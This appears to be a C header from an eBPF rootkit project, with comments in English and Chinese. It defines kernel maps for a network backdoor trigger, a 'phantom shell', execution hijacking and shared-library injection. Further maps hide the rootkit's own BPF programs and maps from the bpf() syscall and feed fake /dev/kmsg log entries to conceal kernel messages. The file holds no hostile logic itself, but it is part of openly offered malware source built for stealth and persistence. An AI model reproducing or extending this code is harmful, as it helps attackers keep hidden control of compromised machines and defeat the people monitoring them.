#ifndef __BPF_MAP_DEFS_H
#define __BPF_MAP_DEFS_H

// 1. 核心包含：引入 vmlinux 定义和 libbpf 宏
// 确保 constants.h 已经包含了 headervmlinux.h
#include "../../../common/constants.h" 
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_endian.h>

// 2. 包含项目通信头文件
#include "../../../common/c&c.h"
/*#ifndef __H_TCKIT
#include "headervmlinux.h"
#else
struct linux_dirent64 {
	long long d_ino;
	unsigned long long d_off;
	short unsigned int d_reclen;
	unsigned char d_type;
	char d_name[0];
};
#endif
#include "../../../common/c&c.h"*/

//Tasks and comms
#define TASK_COMM_LEN 16


/*PRIVATE MAPS*/
//Any attempt to access these maps will be blocked by the rookit

//File system data of a running program which opened some fd
#define FS_OPEN_DATA_PROGRAM_NAME_SIZE 16
#define FS_OPEN_DATA_FILENAME_SIZE 16

//Execution hijacking
#define EXEC_VAR_HIJACK_ACTIVE_DATA_ARGV0_LEN 64

struct fs_open_data{ //Map value
	char* buf;
	int fd;
	__u32 pid;
	char program_name[FS_OPEN_DATA_PROGRAM_NAME_SIZE];
	char filename[FS_OPEN_DATA_FILENAME_SIZE];
	int is_sudo;
};

struct exec_var_hijack_active_data{//Map value
	__u32 pid;
	int hijack_state;
	char argv0[EXEC_VAR_HIJACK_ACTIVE_DATA_ARGV0_LEN];
};

//Map value, contains 3 last packets from an specific IP (the key)
struct backdoor_packet_log_data_32{
	int last_packet_modified;
	struct trigger_32_t trigger_array[3];
};
//Map value, contains 6 last packets from an specific IP (the key)
struct backdoor_packet_log_data_16{
	int last_packet_modified;
	struct trigger_16_t trigger_array[6];
};

//Map value, contains data of phantom shell, if active
//In struct_common.h, it is used from userspace and kernel many times, so moved there

struct inj_ret_address_data{ //Map value
	__u64 libc_syscall_address;
	__u64 stack_ret_address;
	__u64 relro_active;
	__u64 got_address;
	__s32 got_offset;
	__s32 padding;
};


//Map value, stores last dirent info of directory by process
struct fs_dir_log_data{
	struct linux_dirent64 dirent_info;
};

struct fs_priv_open{ //Map
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 4096);
	__type(key, __u64); //thread group id(MSB) + pid (LSB)
	__type(value, struct fs_open_data);
} fs_open SEC(".maps");

struct exec_var_priv_hijack_active{ //Map
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 1);
	__type(key, __u64);
	__type(value, struct exec_var_hijack_active_data);
} exec_var_hijack_active SEC(".maps");

//Map to store log of packets received seeking to find a V3 backdoor trigger
struct backdoor_priv_packet_log_32{ 
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 1024);
	__type(key, __u32); //Source IPv4 of packet
	__type(value, struct backdoor_packet_log_data_32);
} backdoor_packet_log_32 SEC(".maps");
struct backdoor_priv_packet_log_16{ 
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 1024);
	__type(key, __u32); //Source IPv4 of packet
	__type(value, struct backdoor_packet_log_data_16);
} backdoor_packet_log_16 SEC(".maps");


//Map to store state and data of phantom shell
struct backdoor_priv_phantom_shell{ 
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 1);
	__type(key, __u64); //Just 1
	__type(value, struct backdoor_phantom_shell_data);
	__uint(pinning, LIBBPF_PIN_BY_NAME);
} backdoor_phantom_shell SEC(".maps");


//Return addresses of syscalls in the shared library, for the library injection
struct inj_priv_ret_address{ //Map
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 4096);
	__type(key, __u64); //thread group id(MSB) + pid (LSB)
	__type(value, struct inj_ret_address_data);
} inj_ret_address SEC(".maps");


//Stores directories listed by a process, for later processing at its exit
struct fs_priv_dir_log{ //Map
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 4096);
	__type(key, __u64); //thread group id(MSB) + pid (LSB)
	__type(value, struct fs_dir_log_data);
} fs_dir_log SEC(".maps");

//bpf
// 暂存系统调用的上下文
struct bpf_syscall_t {
    void *buf;    // 用户态缓冲区指针
    __u32 cmd;      // bpf() 系统调用的命令号 (如 BPF_PROG_LOAD)
    __u32 id;       // 捕获到的 Program 或 Map 的 ID
} __attribute__((packed));

// 对应 BPF_PROG_GET_NEXT_ID 等操作的用户态数据布局
struct bpf_get_next_id_t {
    union {
        __u32 start_id;
        __u32 prog_id;
        __u32 map_id;
        __u32 btf_id;
    };
    __u32 next_id;
    __u32 open_flags;
} __attribute__((packed));

struct bpf_task_fd_query_t {
    __u32 pid;
    __u32 fd;
    __u32 flags;
    __u32 buf_len;
} __attribute__((packed));
// 1. 暂存区：记录哪个进程正在执行哪个 bpf 命令
struct {
    __uint(type, BPF_MAP_TYPE_LRU_HASH);
    __uint(max_entries, 1024);
    __type(key, __u64); // pid_tgid
    __type(value, struct bpf_syscall_t);
} bpf_cache SEC(".maps");

// 2. 黑名单：存储需要隐藏的 Program IDs
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, __u32); // prog_id
    __type(value, __u32); // 占位符或下一个合法 ID
} bpf_programs SEC(".maps");

// 3. 黑名单：存储需要隐藏的 Map IDs
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, __u32); // map_id
    __type(value, __u32); 
} bpf_maps SEC(".maps");

// 4. 控制位：存储全局状态（如 Rootkit 自身的下一个 ID 哨兵）
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 2);
    __type(key, __u32);
    __type(value, __u32);
} bpf_next_id SEC(".maps");

#define FAKE_KMSG_MAX_LEN 112
#define FAKE_KMSG_COUNT 30

//隐藏kmsg
struct kmsg_data_t {
    __u64 len;
    char content[FAKE_KMSG_MAX_LEN - 8];
};
// 专门为 kmsg 的 read 操作准备的上下文缓存
struct kmsg_read_ctx_t {
    void *buf;   // 用户态缓冲区地址
    __u32 fd;    // 文件描述符
}; 

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, u64);   // pid_tgid
    __type(value, struct kmsg_read_ctx_t);
} kmsg_read_cache SEC(".maps");
// 临时存储 openat 路径的 Map (用于跨 hook 传递数据)
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, u64);   // pid_tgid
    __type(value, char[16]); // 存储路径片段
} tmp_open_paths SEC(".maps");

// 存储 30 条假日志的数组
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, FAKE_KMSG_COUNT);
    __type(key, __u32);
    __type(value, struct kmsg_data_t);
} fa_kmsgs SEC(".maps");

// 用于跟踪哪些 FD 属于 /dev/kmsg
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 2048);
    __type(key, __u64);   // 高32位是 TGID (PID)，低32位是 FD
    __type(value, __u32); // 占位符
} kmsg_fds SEC(".maps");


#endif